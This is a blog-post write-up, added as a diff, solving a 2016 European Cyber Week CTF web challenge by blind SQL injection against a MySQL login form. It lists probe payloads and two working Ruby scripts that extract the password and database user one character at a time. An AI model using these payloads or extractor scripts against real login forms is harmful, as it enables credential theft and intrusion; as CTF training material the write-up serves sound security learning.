@@ -1,0 +1,170 @@
+---
+layout: post
+title: "ECW - 50 - Authentification - Web"
+lang: en
+categories:
+  - security
+  - writeups
+tags:
+  - security
+  - writeups
+  - ctf
+  - web
+date: 2016/11/06
+thumbnail: /images/security-265130_640.jpg
+---
+## Informations
+
+### Version
+
+| By    | Version | Comment
+| ---   | ---     | ---
+| noraj | 1.0     | Creation
+
+### CTF
+
+- **Name** : European Cyber Week CTF Quals 2016
+- **Website** : [challenge-ecw.fr](https://challenge-ecw.fr/)
+- **Type** : Online
+- **Format** : Jeopardy - Student
+
+### Description
+
+N.A.
+
+## Solution
+
+This is a [bling SQL injection][blind] and Out-Of-Band (OOB) channel exfiltration is not working.
+When giving a correct (well formed) SQLi we get the message: `Authentification valide. Le mot de passe est le flag.`.
+So we are able to determine if a request is true or false.
+So the following requests gave us some details about the DB:
+* `' or 1=1 #` => MySQL Database
+* `' or substring(version(),1,1)=5 #` => MySQL 5
+* `' or (select 1)=1 #` => subselect supported
+* `' or (select substring(concat(1,password),1,1) limit 0,1)=1 #` => column name is *password*
+
+So our payload will be `SELECT password`.
+
+And here is the script I wrote :
+
+```ruby
+#!/usr/bin/env ruby
+
+require 'curb' # for get/post requests
+
+hostname = 'https://challenge-ecw.fr/chals/web100'
+nonce = 'myNonce'
+
+c = Curl::Easy.new(hostname) do |curl|
+  curl.headers['Cookie'] = 'session=mySessionCookie'
+  curl.headers['Referer'] = hostname
+  curl.headers['Host'] = 'challenge-ecw.fr'
+  curl.headers['Connection'] = 'keep-alive'
+  curl.headers['Upgrade-Insecure-Requests'] = '1'
+  #curl.verbose = true
+end # Curl
+c.perform # send the request
+
+if c.body_str.match(/Veuillez vous authentifier pour r/)
+  puts '• Connexion to ECW works'
+end
+
+# Request we want to know the answer
+payload = 'SELECT password'
+
+# Find the length of the password
+length = 0
+while true do
+  c.http_post(Curl::PostField.content('password', "' OR LENGTH((#{payload}))=#{length} #"),
+              Curl::PostField.content('nonce', nonce))
+  c.perform
+  if c.body_str.match(/Authentification valide\. Le mot de passe est le flag\./)
+    puts "Length: #{length}"
+    break
+  else
+    puts "Length: not #{length}"
+    length+=1
+  end
+end
+
+
+# Find each char of the password one by one
+answer = ""
+(1..length).each do |offset|
+  (32..126).each do |char|
+    c.http_post(Curl::PostField.content('password', "' OR ASCII(SUBSTRING((#{payload}),#{offset},1))=#{char} #"),
+                Curl::PostField.content('nonce', nonce))
+    c.perform
+    if c.body_str.match(/Authentification valide\. Le mot de passe est le flag\./)
+      answer.concat(char.chr)
+      puts "Password: #{answer}"
+      break
+    else
+      puts "Tried: #{answer}#{char.chr}"
+    end
+  end
+end
+```
+
+We can optimize the time to get the password because we know that the flag is `ECW{md5(string)}` and md5 hashes contains only lower letters and digits that is 32 chars long. So we can fix some parameters:
++ Lenght of the password: **37**
++ Alphabet: **["a", "b", "c", "d", "e", "f", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "E", "C", "W", "{", "}"]**
+
+That give us the more optimized script:
+
+```ruby
+#!/usr/bin/env ruby
+
+require 'curb' # for get/post requests
+
+hostname = 'https://challenge-ecw.fr/chals/web100'
+nonce = 'myNonce'
+
+c = Curl::Easy.new(hostname) do |curl|
+  curl.headers['Cookie'] = 'session=mySessionCookie'
+  curl.headers['Referer'] = hostname
+  curl.headers['Host'] = 'challenge-ecw.fr'
+  curl.headers['Connection'] = 'keep-alive'
+  curl.headers['Upgrade-Insecure-Requests'] = '1'
+  #curl.verbose = true
+end # Curl
+c.perform # send the request
+
+if c.body_str.match(/Veuillez vous authentifier pour r/)
+  puts '• Connexion to ECW works'
+end
+
+# Request we want to know the answer
+payload = 'SELECT password'
+
+length = 37
+
+# Find each char of the password one by one
+answer = ""
+ECW_flag_alphabet_array = ('a'..'f').to_a + (0.to_s..9.to_s).to_a + ['E', 'C', 'W', '{', '}']
+(1..length).each do |offset|
+  ECW_flag_alphabet_array.each do |char|
+    c.http_post(Curl::PostField.content('password', "' OR ASCII(SUBSTRING((#{payload}),#{offset},1))=#{char.ord} #"),
+                Curl::PostField.content('nonce', nonce))
+    c.perform
+    if c.body_str.match(/Authentification valide\. Le mot de passe est le flag\./)
+      answer.concat(char)
+      puts "Password: #{answer}"
+      break
+    else
+      puts "Tried: #{answer}#{char}"
+    end
+  end
+end
+```
+
+So we got the flag: `ECW{d3832d5a1ef4c3bef82b87ced5f50e7d}`.
+
+**BONUS**: I used my script to get the username:
+
+```
+SELECT user()
+User: ecw@localhost
+```
+
+[blind]:https://www.owasp.org/index.php/Blind_SQL_Injection
